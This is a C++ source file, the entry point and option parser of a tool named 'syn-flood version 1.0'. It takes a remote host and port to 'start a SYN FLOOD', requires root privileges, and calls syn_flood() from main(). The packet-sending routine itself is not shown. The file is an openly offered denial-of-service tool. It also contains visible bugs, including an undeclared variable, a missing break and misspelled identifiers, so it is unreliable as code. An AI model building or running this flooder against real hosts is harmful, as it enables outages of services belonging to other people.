#include <iostream>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include "utility.h"
#include "argp.h"
#include "globals.h"
#include "syn.h"
#include <pthread.h>

void process_args(int argc, char **argv, global_config_t &config) {
    extern struct argp argp;

    argp_parse(&argp, argc, argv, ARGP_IN_ORDER, 0, &config);
}

error_t parse_opt(int key, char *arg, struct argp_state *state) {
    global_config_t *config = (global_config_t *)state->input;
    switch(key) {
        case 'q': case 's':
            config->silent = 1;
            break;
        case 'v':
            config->verbose = 1;
            break;
        case 'o':
            strcpy(config->output_file, arg);
            break;
        case 'P':
            char ip[INET_ADDRSTRLEN];
            if (strlen(config->stun_server) == 0) {
                if (dig_get_public_ip(ip, INET_ADDRSTRLEN) == 0)
                    fprintf(stderr, "Your public ipv4 address is: %s\n", ip);
                else
                    fprintf(stderr, "Get public ip failed, use `-v` before `-P` to get debug info.\n");
            } else {
                if (config->stun_server_port == 0)
                    config->stun_server_port = 3478;
                if (config->stun_local_port == 0)
                    config->stun_local_port = 9764;
                if (stun_get_public_ip(config->stun_server, config->stun_server_port, config->stun_local_port, ip) == 0)
                    fprintf(stderr, "Your public ipv4 address is: %s\n", ip);
                else
                    fprintf(stderr, "Get public ip failed, use `-v` before `-P` to get debug info.\n");
            }
            exit(EXIT_SUCCESS);
        case 'L':
            extern const char *stun_server_list;
            fprintf(stderr, "STUN server list: (some maybe DOWN, if port is not specified, then it is 3478 by default)\n%s\n", stun_server_list);
            exit(EXIT_SUCCESS);
        case 'S':
            strcpy(config->stun_server, arg);
            break;
        case 'x':
            config->stun_server_port = (unsigned short)(atoi(arg));
            break;
        case 'X':
            config->stun_local_port = (unsigned short)(atoi(arg));
        case 'e':
            strcpy(config->eth, arg);
            break;
        case 'h':
            strcpy(config->host, arg);
            break;
        case 't':
            config->ttl = atoi(arg);
            break;
        case 'T':
            config->tos = atoi(arg);
            break;
        case 'r':
            if (strlen(config->host) == 0)
                fprintf(stderr, "host not specified!\n");
            else {
                vector<string> ips;
                if (is_valid_ip(config->host))
                    ips.push_back(config->host);
                else {
                    int rc = resolve_fqdn_to_ip(config->host, ips);
                    if (rc != 0)
                        fprintf(stderr, "resolve dns failed, specify -v before -r to get debug info\n");
                }
                for (int i = 0; i < ips.size(); ++i) {
                    fprintf(stderr, "IP(%d): %s\n", (i + 1), ips[i].c_str());
                }
            }
            exit(EXIT_SUCCESS);
        case 'n':
            config->packets = atoi(arg);
            break;
        case 'Q':
            config->local_port = atoi(arg);
            break;
        case 'p':
            config->remote_port = atoi(arg);
            break;
        char source_ip[INET_ADDRSTRLEN];
        case ARGP_KEY_END:
            if (state->argc == 1) {
                argp_usage(state);
            }
            break;
        default:
            return ARGP_ERR_UNKNOWN;
    }
    
    return 0;
}

/* Global Varibles */
const char *argp_program_version = "syn-flood version 1.0\n"
                                   "author: Charles, Liu.\n"
                                   "mailto: charlesliu.cn.bj@gmail.com";
const char *argp_program_bug_address = "<charlesliu.cn.bj@gmail.com>";
const char *program_doc = "\nsyn-flood version 1.0 by Charles, Liu.\n\n If you don't know exactly what these options mean, you can view Internet Protocol(IP) RFC <https://tools.ietf.org/html/rfc791> and TCP RFC <https://tools.ietf.org/html/rfc793>.\n Any questions, you can send email to me <charlesliu.cn.bj@gmail.com> or <charlesliu.cn.bj@qq.com>.";
const char *args_doc = "[-ehLnopPqQrStTvxXV?]";
struct argp_option program_options[] = {
    {"verbose", 'v', 0, 0, "Produce verbose output and debug info"},
    {"quite", 'q', 0, 0, "Don't produce any output"},
    {"silent", 's', 0, OPTION_ALIAS},
    {"output", 'o', "FILE", 0, "Output to FILE instead of standard output"},
    {"tos", 'T', "precedence", 0, "Precedence of the IP packet, should be 0-7, default value is 0."},
    {"ttl", 't', "ttl", 0, "Time-To-Live of the IP packet, should be 1-255, default value is 64."},
    {"host", 'h', "host", 0, "Remote host(fqdn or ipv4 address) to start a SYN FLOOD."},
    {"port", 'p', "port", 0, "Remote port to start a SYN FLOOD."},
    {"stun-server-port", 'x', "port", 0, "STUN server port, use UDP, default to 3478. This is used to get your public ipv4 address."},
    {"stun-local-port", 'X', "port", 0, "STUN local port, use UDP, default to 9764. This is used to get your public ipv4 address."},
    {"stun-server", 'S', "server", 0, "STUN server fqdn or ipv4 address. This is used to get your public ipv4 address."},
    {"public-ip", 'P', 0, 0, "This is used to get your public ipv4 adress, if stun server is not set, dig will be used. If you want to use STUN, `stun-server`, `stun-server-port`, `stun-local-port` should be specified befor `-P`."},
    {"list", 'L', 0, 0, "Get a list of STUN servers, if port is not given, then it is default to 3478, some may not function any more. You can Google more STUN server list, don't depend on this one."},
    {"ethernet", 'e', "ethernet", 0, "Specify the ethernet to send packet."},
    {"resolve-dns", 'r', 0, 0, "Resolve fqdn specified by host to ipv4 address."},
    {"packets", 'n', "packets", 0, "Number of packets to send, default to 1."},
    {"local-port", 'Q', "port", 0, "Specify local port to send SYN packat, default to 9765."},
    {0}
};
struct argp argp = {program_options, parse_opt, args_doc, program_doc};
global_config_t g_config;
const char *stun_server_list = "stun.l.google.com:19305\n"
                               "stun1.l.google.com:19305\n"
                               "stun2.l.google.com:19305\n"
                               "stun3.l.google.com:19305\n"
                               "stun4.l.google.com:19305\n"
                               "stun01.sipphone.com\n"
                               "stun.ekiga.net\n"
                               "stun.fwdnet.net\n"
                               "stun.ideasip.com\n"
                               "stun.iptel.org\n"
                               "stun.rixtelecom.se\n"
                               "stun.schlund.de\n"
                               "stunserver.org\n"
                               "stun.softjoys.com\n"
                               "stun.voiparound.com\n"
                               "stun.voipbuster.com\n"
                               "stun.voipstunt.com\n"
                               "stun.voxgratia.org\n"
                               "stun.xten.com";

#if 0
void *dran_packets(void *param) {
    global_config_t *config = (global_config_t *)param;

    char ip[INET_ADDRSTRLEN];
    if (strlen(config->eth) == 0)
        get_primary_ip(ip, INET_ADDRSTRLEN);
    else
        get_ethernet_ip(config->eth, ip, INET_ADDRSTRLEN);

    struct sockaddr_in drain_addr;
    memset(&dran_addr, 0, sizeof(drain_addr));
    drain_addr.sin_family = AF_INET;
    uint16_t local_port = 9765;
    if (config->local_port != 0)
        local_port = (uint16_t)config->local_port;
    drain_addr.sin_port = htons(local_port);

    return NULL;
}
#endif

int main(int argc, char **argv) {
    if (check_root_privilege() != 0) {
        SYSLOG("you must have super user privilege to run this program.");
        exit(EXIT_FAILURE);
    }
    process_args(argc, argv, g_config);

    rc = syn_flood();
    if (rc < 0) {
        SF_SYSLOG("SYN FLOOOOOOOOOOOOOOOOD FAILED!!!");
        exit(EXIT_FAILURE);
    }

    while (true) {
        sleep(86400);
    }

    return 0;
}
